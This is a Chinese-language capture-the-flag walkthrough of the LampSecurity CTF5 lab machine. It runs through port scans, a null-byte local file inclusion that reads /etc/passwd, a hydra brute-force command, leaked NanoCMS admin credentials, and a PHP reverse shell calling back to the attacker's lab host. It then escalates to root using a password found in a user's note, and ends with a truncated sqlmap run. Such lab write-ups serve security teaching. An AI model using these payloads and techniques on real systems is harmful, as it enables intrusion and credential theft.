seconds\n\n┌──(kali㉿kali)-[~]└─$ sudo nmap -p- --min-rate=10000 192.168.56.139Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 15:40 CSTNmap scan report for 192.168.56.139Host is up (0.0017s latency).Not shown: 65524 closed tcp ports (reset)PORT      STATE SERVICE22/tcp    open  ssh25/tcp    open  smtp80/tcp    open  http110/tcp   open  pop3111/tcp   open  rpcbind139/tcp   open  netbios-ssn143/tcp   open  imap445/tcp   open  microsoft-ds901/tcp   open  samba-swat3306/tcp  open  mysql53728/tcp open  unknownMAC Address: 00:0C:29:7D:00:15 (VMware)Nmap done: 1 IP address (1 host up) scanned in 6.57 seconds\n开了这么多端口，如此多的可能性。可能比较好用的攻击向量：80-web, 139&amp;445-samba然后是：53728，901，25，110，111剩下其他的最后看。\n┌──(kali㉿kali)-[~]└─$ sudo nmap -sU -p- --min-rate=10000 192.168.56.139                          Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 15:48 CSTWarning: 192.168.56.139 giving up on port because retransmission cap hit (10).Nmap scan report for 192.168.56.139Host is up (0.0014s latency).Not shown: 65454 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)PORT      STATE SERVICE111/udp   open  rpcbind5353/udp  open  zeroconf32768/udp open  omadMAC Address: 00:0C:29:7D:00:15 (VMware)Nmap done: 1 IP address (1 host up) scanned in 72.70 second\n都可以看看。\n┌──(kali㉿kali)-[~]└─$ sudo nmap -sT -sV -O -p22,25,80,110,111,139,143,445,901,3306,5353,32768,53728 192.168.56.139Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 15:54 CSTNmap scan report for 192.168.56.139Host is up (0.00098s latency).PORT      STATE  SERVICE     VERSION22/tcp    open   ssh         OpenSSH 4.7 (protocol 2.0)25/tcp    open   smtp        Sendmail 8.14.1/8.14.180/tcp    open   http        Apache httpd 2.2.6 ((Fedora))110/tcp   open   pop3        ipop3d 2006k.101111/tcp   open   rpcbind     2-4 (RPC #100000)139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)143/tcp   open   imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)445/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)901/tcp   open   http        Samba SWAT administration server3306/tcp  open   mysql       MySQL 5.0.455353/tcp  closed mdns32768/tcp closed filenet-tms53728/tcp open   status      1 (RPC #100024)MAC Address: 00:0C:29:7D:00:15 (VMware)Device type: general purposeRunning: Linux 2.6.XOS CPE: cpe:/o:linux:linux_kernel:2.6OS details: Linux 2.6.9 - 2.6.30Network Distance: 1 hopService Info: Hosts: localhost.localdomain, 192.168.56.139; OS: UnixOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 13.11 seconds\n\n┌──(kali㉿kali)-[~]└─$ sudo nmap --script=vuln 192.168.56.139Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 15:55 CSTPre-scan script results:| broadcast-avahi-dos: |   Discovered hosts:|     224.0.0.251|   After NULL UDP avahi packet DoS (CVE-2011-1002).|_  Hosts are all up (not vulnerable).Nmap scan report for 192.168.56.139Host is up (0.0014s latency).Not shown: 990 closed tcp ports (reset)PORT     STATE SERVICE22/tcp   open  ssh25/tcp   open  smtp| smtp-vuln-cve2010-4344: |_  The SMTP server is not Exim: NOT VULNERABLE80/tcp   open  http| http-csrf: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.139|   Found the following possible CSRF vulnerabilities: |     |     Path: http://192.168.56.139:80/?page=contact|     Form id: |     Form action: ?page=contact|     |     Path: http://192.168.56.139:80/events/|     Form id: user-login-form|     Form action: /events/?q=node&amp;destination=node|     |     Path: http://192.168.56.139:80/events/?q=user/register|     Form id: user-register|     Form action: /events/?q=user/register|     |     Path: http://192.168.56.139:80/events/?q=user/password|     Form id: user-pass|     Form action: /events/?q=user/password|     |     Path: http://192.168.56.139:80/events/?q=event/2009/04/29|     Form id: event-taxonomy-filter-form|     Form action: /events/?q=event/2009/04/29|     |     Path: http://192.168.56.139:80/events/?q=event/2009/04/29|     Form id: event-type-filter-form|     Form action: /events/?q=event/2009/04/29|     |     Path: http://192.168.56.139:80/events/?q=event/2009/04/29|     Form id: user-login-form|     Form action: /events/?q=event/2009/04/29&amp;destination=event%2F2009%2F04%2F29|     |     Path: http://192.168.56.139:80/events/?q=event/2023/04/26/month|     Form id: event-taxonomy-filter-form|     Form action: /events/?q=event/2023/04/26/month|     |     Path: http://192.168.56.139:80/events/?q=event/2023/04/26/month|     Form id: event-type-filter-form|     Form action: /events/?q=event/2023/04/26/month|     |     Path: http://192.168.56.139:80/events/?q=event/2023/04/26/month|     Form id: user-login-form|     Form action: /events/?q=event/2023/04/26/month&amp;destination=event%2F2023%2F04%2F26%2Fmonth|     |     Path: http://192.168.56.139:80/events/?q=event|     Form id: event-taxonomy-filter-form|     Form action: /events/?q=event|     |     Path: http://192.168.56.139:80/events/?q=event|     Form id: event-type-filter-form|     Form action: /events/?q=event|     |     Path: http://192.168.56.139:80/events/?q=event|     Form id: user-login-form|     Form action: /events/?q=event&amp;destination=event|     |     Path: http://192.168.56.139:80/events/?q=event/2023/03/01/month/all/all/1|     Form id: event-taxonomy-filter-form|     Form action: /events/?q=event/2023/03/01/month/all/all/1|     |     Path: http://192.168.56.139:80/events/?q=event/2023/03/01/month/all/all/1|     Form id: event-type-filter-form|     Form action: /events/?q=event/2023/03/01/month/all/all/1|     |     Path: http://192.168.56.139:80/events/?q=event/2023/03/01/month/all/all/1|     Form id: user-login-form|     Form action: /events/?q=event/2023/03/01/month/all/all/1&amp;destination=event%2F2023%2F03%2F01%2Fmonth%2Fall%2Fall%2F1|     |     Path: http://192.168.56.139:80/events/?q=node&amp;amp;destination=node|     Form id: user-login-form|     Form action: /events/?q=node&amp;destination=node%3Famp%253Bdestination%3Dnode|     |     Path: http://192.168.56.139:80/events/?q=blog|     Form id: user-login-form|     Form action: /events/?q=blog&amp;destination=blog|     |     Path: http://192.168.56.139:80/events/?q=comment/reply/2|     Form id: comment-form|     Form action: /events/?q=comment/reply/2|     |     Path: http://192.168.56.139:80/events/?q=comment/reply/2|     Form id: user-login-form|     Form action: /events/?q=comment/reply/2&amp;destination=comment%2Freply%2F2|     |     Path: http://192.168.56.139:80/events/?q=node/2|     Form id: user-login-form|     Form action: /events/?q=node/2&amp;destination=node%2F2|     |     Path: http://192.168.56.139:80/events/?q=blog/1|     Form id: user-login-form|_    Form action: /events/?q=blog/1&amp;destination=blog%2F1|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.| http-slowloris-check: |   VULNERABLE:|   Slowloris DOS attack|     State: LIKELY VULNERABLE|     IDs:  CVE:CVE-2007-6750|       Slowloris tries to keep many connections to the target web server open and hold|       them open as long as possible.  It accomplishes this by opening connections to|       the target web server and sending a partial request. By doing so, it starves|       the http server&#x27;s resources causing Denial Of Service.|       |     Disclosure date: 2009-09-17|     References:|       http://ha.ckers.org/slowloris/|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750| http-enum: |   /info.php: Possible information file|   /phpmyadmin/: phpMyAdmin|   /squirrelmail/src/login.php: squirrelmail version 1.4.11-1.fc8|   /squirrelmail/images/sm_logo.png: SquirrelMail|   /icons/: Potentially interesting folder w/ directory listing|_  /inc/: Potentially interesting folder| http-fileupload-exploiter: |   |_    Couldn&#x27;t find a file-type field.|_http-trace: TRACE is enabled| http-sql-injection: |   Possible sqli for queries:|     http://192.168.56.139:80/?page=contact%27%20OR%20sqlspider|     http://192.168.56.139:80/?page=about%27%20OR%20sqlspider|     http://192.168.56.139:80/?page=contact%27%20OR%20sqlspider|     http://192.168.56.139:80/?page=about%27%20OR%20sqlspider|     http://192.168.56.139:80/?page=contact%27%20OR%20sqlspider|     http://192.168.56.139:80/?page=about%27%20OR%20sqlspider|     http://192.168.56.139:80/?page=contact%27%20OR%20sqlspider|     http://192.168.56.139:80/?page=about%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Ffeed%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Ffeed%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Ffeed%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Ffeed%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|_    http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.110/tcp  open  pop3111/tcp  open  rpcbind139/tcp  open  netbios-ssn143/tcp  open  imap445/tcp  open  microsoft-ds901/tcp  open  samba-swat3306/tcp open  mysql|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)MAC Address: 00:0C:29:7D:00:15 (VMware)Host script results:|_smb-vuln-ms10-061: false|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)|_smb-vuln-ms10-054: falseNmap done: 1 IP address (1 host up) scanned in 170.56 seconds\nhttp-enum和http-sql-injection部分挺让人感兴趣。之后重点看看。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf5/workSpace]└─$ sudo nikto -h 192.168.56.139          [sudo] password for kali: - Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          192.168.56.139+ Target Hostname:    192.168.56.139+ Target Port:        80+ Start Time:         2023-04-26 16:29:26 (GMT8)---------------------------------------------------------------------------+ Server: Apache/2.2.6 (Fedora)+ /: Retrieved x-powered-by header: PHP/5.2.4.+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ Apache/2.2.6 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing+ /index.php: PHP include error may indicate local or remote file inclusion is possible.+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184+ /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.+ /phpmyadmin/ChangeLog: Server may leak inodes via ETags, header found with file /phpmyadmin/ChangeLog, inode: 558008, size: 22676, mtime: Tue Aug 21 10:59:12 2029. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418+ /phpmyadmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.+ /mail/src/read_body.php: Cookie SQMSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies+ /mail/src/read_body.php: SquirrelMail found.+ /squirrelmail/src/read_body.php: SquirrelMail found.+ /info.php: Output from the phpinfo() function was found.+ /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552+ /icons/: Directory indexing found.+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/+ /info.php?file=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2+ /phpmyadmin/: phpMyAdmin directory found.+ /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.+ /phpmyadmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts. See: https://typo3.org/+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.+ 8908 requests: 0 error(s) and 26 item(s) reported on remote host+ End Time:           2023-04-26 16:29:51 (GMT8) (25 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n\nExploitRFI（F）之前nikto中发现/info.php?file=可能存在远程文件包含，实际试了一下发现并不行。\nSQLi（F）再看看sql注入，如果能直接拿到登录凭证那美滋滋。先sqlmap扫一下[http://192.168.56.139:80/events/?q=event%2Fical](http://192.168.56.139:80/events/?q=event%2Fical)，发现没有注入点。手动看看发现是下载一个文件。再sqlmap扫一下[http://192.168.56.139:80/?page=contact](http://192.168.56.139:80/?page=contact)，还是没有注入点。\nLFI（F）直接访问发现报错，报错信息如下\nsudo curl &#x27;http://192.168.56.139/?page=../../../../../../../etc/passwd&#x27;&lt;div id=&quot;main&quot;&gt;&lt;b&gt;Warning&lt;/b&gt;:  include_once(inc/../../../../../../../etc/passwd.php) [&lt;a href=&#x27;function.include-once&#x27;&gt;function.include-once&lt;/a&gt;]: failed to open stream: No such file or directory in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;6&lt;/b&gt;&lt;b&gt;Warning&lt;/b&gt;:  include_once() [&lt;a href=&#x27;function.include&#x27;&gt;function.include&lt;/a&gt;]: Failed opening &#x27;inc/../../../../../../../etc/passwd.php&#x27; for inclusion (include_path=&#x27;.:/usr/share/pear:/usr/share/php&#x27;) in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;6&lt;/b&gt;&lt;/div&gt;\n一眼文件包含漏洞，由于后面有.php，我们之前看phpinfo页面发现此PHP版本存在0字符截断漏洞。直接截断。\n# http://192.168.56.139/?page=../../../../../../../etc/passwd%00root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin nscd:x:28:28:NSCD Daemon:/:/sbin/nologin tcpdump:x:72:72::/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin rpm:x:37:37:RPM user:/var/lib/rpm:/sbin/nologin polkituser:x:87:87:PolicyKit:/:/sbin/nologin avahi:x:499:499:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin apache:x:48:48:Apache:/var/www:/sbin/nologin ntp:x:38:38::/etc/ntp:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin openvpn:x:498:497:OpenVPN:/etc/openvpn:/sbin/nologin rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin torrent:x:497:496:BitTorrent Seed/Tracker:/var/spool/bittorrent:/sbin/nologin haldaemon:x:68:68:HAL daemon:/:/sbin/nologin gdm:x:42:42::/var/gdm:/sbin/nologin patrick:x:500:500:Patrick Fair:/home/patrick:/bin/bash jennifer:x:501:501:Jennifer Sea:/home/jennifer:/bin/bash andy:x:502:502:Andrew Carp:/home/andy:/bin/bash loren:x:503:503:Loren Felt:/home/loren:/bin/bash amy:x:504:504:Amy Pendelton:/home/amy:/bin/bash mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash\n可看到/etc/passwd内容，可惜看不到shadow的内容，想看看配置信息啥的无果。先暂时搁置这个漏洞。\nSamba（F）┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf5/workSpace]└─$ sudo nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 192.168.56.139[sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 16:54 CSTNmap scan report for 192.168.56.139Host is up (0.00053s latency).PORT    STATE SERVICE445/tcp open  microsoft-dsMAC Address: 00:0C:29:7D:00:15 (VMware)Host script results:| smb-enum-shares: |   account_used: &lt;blank&gt;|   \\\\192.168.56.139\\IPC$: |     Type: STYPE_IPC_HIDDEN|     Comment: IPC Service (Samba Server Version 3.0.26a-6.fc8)|     Users: 1|     Max Users: &lt;unlimited&gt;|     Path: C:\\tmp|_    Anonymous access: READ/WRITE| smb-enum-users: |   LOCALHOST\\amy (RID: 2008)|     Full name:   Amy Pendelton|     Flags:       Normal user account|   LOCALHOST\\andy (RID: 2004)|     Full name:   Andrew Carp|     Flags:       Normal user account|   LOCALHOST\\jennifer (RID: 2002)|     Full name:   Jennifer Sea|     Flags:       Normal user account|   LOCALHOST\\loren (RID: 2006)|     Full name:   Loren Felt|     Flags:       Normal user account|   LOCALHOST\\patrick (RID: 2000)|     Full name:   Patrick Fair|_    Flags:       Normal user accountNmap done: 1 IP address (1 host up) scanned in 4.12 seconds\n看看我们的samba服务吧，扫出了各用户名以及共享的地址再用smbmap扫一下\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf5/workSpace]└─$ smbmap -H 192.168.56.139                 [+] IP: 192.168.56.139:445      Name: unknown                                           Disk        Permissions     Comment----        -----------     -------homes       NO ACCESS       Home DirectoriesIPC$        NO ACCESS       IPC Service (Samba Server Version 3.0.26a-6.fc8)\n得，都是NO ACCESS。寄\n# Not usehydra -l andy -P /usr/share/wordlists/rockyou.txt 192.168.56.139 http-post-form &quot;/~andy/data/nanoadmin.php:SQMSESSID=b2pdpdkh3rlkvukqr0jbssur30; PHPSESSID=7rlrvoh72sto2t935mmr4l99e0; SESS100a7dde408e54bc0d12aead519a7cc5=i1u9c4qe9er2gu0r1ou19tqhj1;user=^USER^&amp;pass=^PASS^:F=wrong Username or Password&quot;Cookie: SQMSESSID=b2pdpdkh3rlkvukqr0jbssur30; PHPSESSID=7rlrvoh72sto2t935mmr4l99e0; SESS100a7dde408e54bc0d12aead519a7cc5=i1u9c4qe9er2gu0r1ou19tqhj1Upgrade-Insecure-Requests: 1user=1111&amp;pass=2222\n\nNanoCMS（S）在后台登录界面，我们可以发现cms是nanocms，在exp-db上查一下，发现只有一个已登录用户的RCE漏洞。再在搜索引擎查一查search in bing: nanocms exploit，发现nanoCMS存在一个数据泄露漏洞。虽然不知道nanocms的版本，但是还是试试吧，死马当活马医。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf5/workSpace]└─$ curl http://192.168.56.139/~andy/data/pagesdata.txta:12:&#123;s:8:&quot;homepage&quot;;s:1:&quot;1&quot;;s:10:&quot;links_cats&quot;;a:4:&#123;s:7:&quot;sidebar&quot;;a:2:&#123;i:0;i:1;i:1;i:4;&#125;s:11:&quot;other-pages&quot;;a:0:&#123;&#125;s:14:&quot;top-navigation&quot;;a:2:&#123;i:0;s:1:&quot;1&quot;;i:1;s:1:&quot;4&quot;;&#125;s:12:&quot;Footer-Right&quot;;a:2:&#123;i:0;s:1:&quot;1&quot;;i:1;s:1:&quot;4&quot;;&#125;&#125;s:5:&quot;slugs&quot;;a:2:&#123;i:1;s:4:&quot;home&quot;;i:4;s:7:&quot;contact&quot;;&#125;s:6:&quot;titles&quot;;a:2:&#123;i:1;s:4:&quot;Home&quot;;i:4;s:7:&quot;Contact&quot;;&#125;s:10:&quot;slug_count&quot;;i:12;s:8:&quot;settings&quot;;a:3:&#123;s:19:&quot;index-last-modified&quot;;i:1234513760;s:18:&quot;def-template-areas&quot;;a:4:&#123;i:0;s:12:&quot;website name&quot;;i:2;s:14:&quot;website slogan&quot;;i:3;s:16:&quot;below navigation&quot;;i:4;s:16:&quot;copyright notice&quot;;&#125;s:18:&quot;def-template-links&quot;;a:2:&#123;i:0;s:14:&quot;top-navigation&quot;;i:1;s:12:&quot;Footer-Right&quot;;&#125;&#125;s:13:&quot;active-tweaks&quot;;a:2:&#123;i:0;s:7:&quot;deutsch&quot;;i:1;s:19:&quot;language-pack-tweak&quot;;&#125;s:11:&quot;lang-select&quot;;s:7:&quot;english&quot;;s:6:&quot;seourl&quot;;s:1:&quot;0&quot;;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:32:&quot;9d2f75377ac0ab991d40c91fd27e52fd&quot;;s:7:&quot;version&quot;;s:4:&quot;v_4f&quot;;&#125;   \n发现竟然爆出了username和password。直接把md5值的密码丢去破解。OK登录后台OK四处找了找，发现可以编辑页面的地方，决定隐蔽点在contact页面插个反弹shell。\n&lt;?php exec(&quot;/bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.132/8080 0&gt;&amp;1&#x27;&quot;) ?&gt;\n成功获取shell。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf5/workSpace]└─$ sudo nc -lvp 443 listening on [any] 443 ...192.168.56.139: inverse host lookup failed: Host name lookup failureconnect to [192.168.56.132] from (UNKNOWN) [192.168.56.139] 54757bash: no job control in this shellbash-3.2$ whoamiapachebash-3.2$ ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000    link/ether 00:0c:29:7d:00:15 brd ff:ff:ff:ff:ff:ff    inet 192.168.56.139/24 brd 192.168.56.255 scope global eth1    inet6 fe80::20c:29ff:fe7d:15/64 scope link        valid_lft forever preferred_lft foreverbash-3.2$\nPriv Esudo -l need password.\nfind / -type f -perm -04000 -ls 2&gt;/dev/null没有有价值的，at用了总是失败，其他没有啥能用的。\nbash-3.2$ cat /etc/crontabSHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=rootHOME=/# run-parts01 * * * * root run-parts /etc/cron.hourly02 4 * * * root run-parts /etc/cron.daily22 4 * * 0 root run-parts /etc/cron.weekly42 4 1 * * root run-parts /etc/cron.monthly\n一个个去定时任务文件夹里看了一遍，研究了下&#x2F;etc&#x2F;cron.daily里的一个定时任务，没发现可以利用的东西。\n传一下lse.sh上去，执行后发现这个shell不支持颜色显示语法，可读性极差。。。换成linpeas，发现可以正常显示颜色。还得是他。可惜还是没有提供特别有用的信息，虽然此系统版本很低，很有可能可以内核提权，但是，太不稳定了，还是不试了。\n看了下视频思路：\n\nThere so many user in the system that maybe some of them would left credentials in their files. So why not take a try?多用户环境下，保不齐会有带路党，反正试试不吃亏。\n\n所以我们递归忽略大小写搜一下/home下的文件里的pass字段\n# -R recursion -i ignore Capgrep -R -i pass /home/* 2&gt;/dev/null\n\n/home/andy/public_html/data/admin-design/loginform.php:    &lt;tr&gt;&lt;td&gt;&lt;?php _lt(&#x27;Password&#x27;); ?&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=&#x27;password&#x27; name=&#x27;pass&#x27;&gt;&lt;/td&gt;&lt;/tr&gt;/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:  &lt;title&gt;Root password&lt;/title&gt;/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:  &lt;text xml:space=&quot;preserve&quot;&gt;&lt;note-content version=&quot;0.1&quot;&gt;Root password/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:Root password/home/patrick/.tomboy.log:12/5/2012 7:24:46 AM [DEBUG]: Renaming note from New Note 3 to Root password/home/patrick/.tomboy.log:12/5/2012 7:24:56 AM [DEBUG]: Saving &#x27;Root password&#x27;.../home/patrick/.tomboy.log:12/5/2012 7:25:03 AM [DEBUG]: Saving &#x27;Root password&#x27;...\n\n# cat /home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;note version=&quot;0.2&quot; xmlns:link=&quot;http://beatniksoftware.com/tomboy/link&quot; xmlns:size=&quot;http://beatniksoftware.com/tomboy/size&quot; xmlns=&quot;http://beatniksoftware.com/tomboy&quot;&gt;  &lt;title&gt;Root password&lt;/title&gt;  &lt;text xml:space=&quot;preserve&quot;&gt;&lt;note-content version=&quot;0.1&quot;&gt;Root passwordRoot password50$cent&lt;/note-content&gt;&lt;/text&gt;  &lt;last-change-date&gt;2012-12-05T07:24:52.7364970-05:00&lt;/last-change-date&gt;  &lt;create-date&gt;2012-12-05T07:24:34.3731780-05:00&lt;/create-date&gt;  &lt;cursor-position&gt;15&lt;/cursor-position&gt;  &lt;width&gt;450&lt;/width&gt;  &lt;height&gt;360&lt;/height&gt;  &lt;x&gt;0&lt;/x&gt;  &lt;y&gt;0&lt;/y&gt;  &lt;open-on-startup&gt;False&lt;/open-on-startup&gt;&lt;/note&gt;\n密码发现，存的还是root密码，离谱。\nash-3.2$ susuPassword: 50$cent[root@localhost bin]# whoamiwhoamiroot[root@localhost bin]# ip aip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000    link/ether 00:0c:29:7d:00:15 brd ff:ff:ff:ff:ff:ff    inet 192.168.56.139/24 brd 192.168.56.255 scope global eth1    inet6 fe80::20c:29ff:fe7d:15/64 scope link        valid_lft forever preferred_lft forever[root@localhost bin]#\n搞定。\n补充实际上测试SQLi的时候还是不够细，光想着url里的参数了。老惦记那BGET方法干吗。真得想想POST的事吧。在192.168.56.139/list/页面中，4个form输入框存在SQLi漏洞，加个&#39;试出来了。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf5/workSpace]└─$ sudo sqlmap -u http://192.168.56.139/list/ --data &#x27;name=1&amp;email=&amp;phone=&amp;org=&#x27;         ___       __H__                                                                                     ___ ___[&quot;]_____ ___ ___  &#123;1.7.2#stable&#125;                                                        |_ -| . [&quot;]     | .&#x27;| . |                                                                       |___|_  [)]_|_|_|__,|  _|                                                                             |_|V...       |_|   https://sqlmap.org                                                    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 15:16:57 /2023-04-27/[15:16:57] [WARNING] provided value for parameter &#x27;email&#x27; is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[15:16:57] [WARNING] provided value for parameter &#x27;phone&#x27; is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[15:16:57] [WARNING] provided value for parameter &#x27;org&#x27; is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[15:16:57] [INFO] testing connection to the target URL[15:16:58] [INFO] testing if the target URL content is stable[15:16:58] [INFO] target URL content is stable[15:16:58] [INFO] testing if POST parameter &#x27;name&#x27; is dynamic[15:16:58] [WARNING] POST parameter &#x27;name&#x27; does not appear to be dynamic[15:16:58] [INFO] heuristic (basic) test shows that POST parameter &#x27;name&#x27; might be injectable (possible DBMS: &#x27;MySQL&#x27;)[15:16:58] [INFO] heuristic (XSS) test shows that POST parameter &#x27;name&#x27; might be vulnerable to cross-site scripting (XSS) attacks[15:16:58] [INFO] testing for SQL injection on POST parameter &#x27;name&#x27;it looks like the back-end DBMS is &#x27;MySQL&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] for the remaining tests, do you want to include all tests for &#x27;MySQL&#x27; extending provided level (1) and risk (1) values? [Y/n] [15:17:06] [INFO] testing &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;[15:17:06] [WARNING] reflective value(s) found and filtering out[15:17:06] [INFO] testing &#x27;Boolean-based blind - Parameter replace (original value)&#x27;[15:17:06] [INFO] testing &#x27;Generic inline queries&#x27;[15:17:06] [INFO] 